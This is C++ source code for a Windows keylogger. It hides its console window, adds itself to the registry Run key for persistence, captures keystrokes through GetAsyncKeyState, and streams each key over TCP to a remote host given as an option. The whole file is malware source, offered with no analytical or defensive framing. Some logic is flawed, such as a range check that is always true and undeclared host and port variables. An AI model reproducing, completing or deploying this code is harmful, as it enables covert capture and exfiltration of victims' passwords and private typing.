#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<winuser.h>
#include<windowsx.h>
#include<stdint.h>
#include<memory.h>
#include<signal.h>
#include<unistd.h>

#include "option.h"
#include "SocketAddr.hpp"

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#define FLAG "clientKey"

#pragma comment(lib, "ws2_32.lib");

static char *baseName = NULL;
static Option options[] = {
	{ OPT_STRING, "base", &baseName, "baseName"},
	{ OPT_STRING, "host", &host, "remote host"},
	{ OPT_UINT, "port", &port, "remote port"}
};


char logFileName[100];

int test_key(void);
int create_key(char *);
int get_keys(void);

void myUsleep(int64_t usec);

class Client {
	public:
		SocketAddr remote;
		Client() {
			connHd = connect(true);
			if (connHd == INVALID_SOCKET) exit(-1);
		}

		Client(string host, unsigned port) {
			remote = SocketAddr(host, port);
			*this = Client();
			string base = string(baseName);
			exeName = base + ".exe";
			logName = base + ".log";
			memset(buf, '\0', sizeof(buf));
		}

		void run() {
			fprintf(stderr, "Client start running with handle %d\n", connHd);
			hide();
			int test = testKey();
			if (test == 2) {
				string folder = "c:\\Users\\user\\Desktop\\malware\\bin\\";
				string path = folder + exeName;
				fprintf(stderr, "%s\n", path.c_str());

				if (createKey(path.c_str())) 
					fprintf(stderr, "key create success\n");
			} else {
				fprintf(stderr, "testKey failed %d\n", test);
			}

			while (true) {
				myUsleep(1);
				string key = getKey();
				char L = key.length();
				if (L == 0) continue;
				L = htonl(L);
				send(connHd, &L, 1, 0);
				send(connHd, key.c_str(), L, 0);
			}
		}

	private:
		string exeName;
		string logName;
		char buf[1024];
		SOCKET connHd = INVALID_SOCKET;

		void hide()
		{
			HWND stealth;
			AllocConsole();
			stealth = FindWindowA("ConsoleWindowClass", NULL);
			ShowWindow(stealth, 0);
		}

		int testKey() {
			HKEY hKey;
			int check;
			#define BUFSIZE 200
			char path[BUFSIZE];
			DWORD bufLength = BUFSIZE;
			int regKey;

			regKey = RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey);

			if (regKey != 0) {
				RegCloseKey(hKey);
				return 1;
			}

			regKey = RegQueryValueEx(hKey, FLAG, NULL, NULL, (LPBYTE)path, &bufLength);
			if (regKey == ERROR_SUCCESS) return 0;

			if (bufLength > BUFSIZE) return 2;
			if (regKey != 0 || (bufLength > BUFSIZE)) {
				RegCloseKey(hKey);
				return 2;
			}

			if (regKey == 0) {
				RegCloseKey(hKey);
				return 0;
			}
		}

		bool createKey(const char *path)
		{
			if (path == NULL) return false;
			HKEY hkey;
			int regKey = RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);

			if (regKey == ERROR_SUCCESS) {
				int err;
				if ((err = RegSetValueEx(hkey, FLAG, 0, REG_SZ, (const BYTE *)path, strlen(path))) == ERROR_SUCCESS) return true;
				else {
					fprintf(stderr, "create key error with code %d\n", err);
				}
			}

			return false;
		}

		string getKey()
		{
			for (short character = 8; character <= 222; character++) {
				if (GetAsyncKeyState(character) == -0x7fff) {
					if (0x30 <= character && character < 0x3a) {
						buf[0] = '0' + (character - 0x30);
						buf[1] = '\0';
						return string(buf);
					}
					if (0x41 <= character && character <= 0x5a) {
						buf[0] = character + 32; buf[1] = '\0';
						if (GetKeyState(VK_CAPITAL) & 0x0001 != 0)
							buf[0] -= 32;
						return string(buf);
					}

					if (0x70 <= character && character <= 0x87) {
						sprintf(buf, "F%d", character - 0x70 + 1);
						return string(buf);
					}

					switch(character) {
						case VK_SPACE:
							return " ";
						case VK_PRIOR:
							return "[PAGE UP]";
						case VK_NEXT:
							return "[PAGE DOWN]";
						case VK_END:
							return "[END]";
						case VK_HOME:
							return "[HOME]";
						case VK_LEFT:
							return "[<-]";
						case VK_UP:
							return "[up]";
						case VK_RIGHT:
							return "[->]";
						case VK_DOWN:
							return "[down]";
						case VK_SELECT:
							return "[SELECT]";
						case VK_PRINT:
							return "[PRINT]";
						case VK_SNAPSHOT:
							return "[PRINT-SCREEN]";
						case VK_INSERT:
							return "[INSERT]";
						case VK_DELETE:
							return "[DELETE]";
						case VK_MULTIPLY:
							return "*";
						case VK_ADD:
							return "+";
						case VK_SUBTRACT:
							return "-";
						case VK_DIVIDE:
							return "/";
						case VK_RSHIFT:
						case VK_LSHIFT:
							return "[SHIFT]";
						case VK_RETURN:
							return "\n[ENTER]";
						case VK_BACK:
							return "[BACKSPACE]";
						case VK_TAB:
							return "[TAB]";
						case VK_RCONTROL:
						case VK_LCONTROL:
							return "[CTRL]";
						case VK_OEM_1:
							return "[;:]";
						case VK_OEM_2:
							return "[/?]";
						case VK_OEM_3:
							return "[`~]";
						case VK_OEM_4:
							return "[ [{ ]";
						case VK_OEM_5:
							return "[\\|]";
						case VK_OEM_6:
							return "[ ]} ]";
						case VK_OEM_7:
							return "['\"]";
						case VK_CAPITAL:
							return "[CAPS LOCK]";
						case VK_ESCAPE:
							return "[ESC]";
					}

					if (0x60 <= character <= 0x69) {
						buf[0] = character - 0x60 + '0'; buf[1] = '\0';
						return string(buf);
					}

					return "[unk]";
				}
			}

			return "";
		}

		int connect(bool first) {
			WSADATA wsa;
			SOCKET handle;

			fprintf(stderr, "Initializing Winsock\n");

			if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
				fprintf(stderr, "failed. error code: %d\n", WSAGetLastError());
				exit(-1);
			}

			fprintf(stderr, "init success\n");

			struct addrinfo hints;
			struct addrinfo *result, *rp;
			int status;

			memset(&hints, 0, sizeof(struct addrinfo));
			hints.ai_family = AF_INET;
    		hints.ai_socktype = SOCK_STREAM;
    		hints.ai_flags = 0;
    		hints.ai_addrlen = 0;
    		hints.ai_protocol = IPPROTO_TCP;
    		hints.ai_canonname = NULL;
    		hints.ai_addr = NULL;
    		hints.ai_next = NULL;

    		status = getaddrinfo(remote.host().c_str(), to_string(remote.port()).c_str(), &hints, &result);
			if (status < 0) {
				if (first) fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
				return INVALID_SOCKET;
			}

			for (rp = result; rp != NULL; rp = rp->ai_next) {
				SOCKET handle = socket(AF_INET, SOCK_STREAM, 0);
				if (handle == INVALID_SOCKET) continue;
				if (::connect(handle, rp->ai_addr, rp->ai_addrlen) != INVALID_SOCKET) return handle;

				int err = WSAGetLastError();
				if (err == 10061) {
					fprintf(stderr, "connect: connection refused\n");
				} else {
					fprintf(stderr, "connect: %d\n", err);
				}

				close(handle);
			}

			return INVALID_SOCKET;
		}
};

int main(int argc, char *argv[])
{
	Opt_Parse(argc, argv, options, Opt_Number(options), 0);
	if (baseName == NULL) {
		fprintf(stderr, "must specify baseName\n");
		exit(0);
	}
	Client client(host, port);
	client.run();
}

void myUsleep(int64_t usec)
{ 
    HANDLE timer; 
    LARGE_INTEGER ft; 

    ft.QuadPart = -(10*usec); // Convert to 100 nanosecond interval, negative value indicates relative time

    timer = CreateWaitableTimer(NULL, TRUE, NULL); 
    SetWaitableTimer(timer, &ft, 0, NULL, NULL, 0); 
    WaitForSingleObject(timer, INFINITE); 
    CloseHandle(timer); 
}
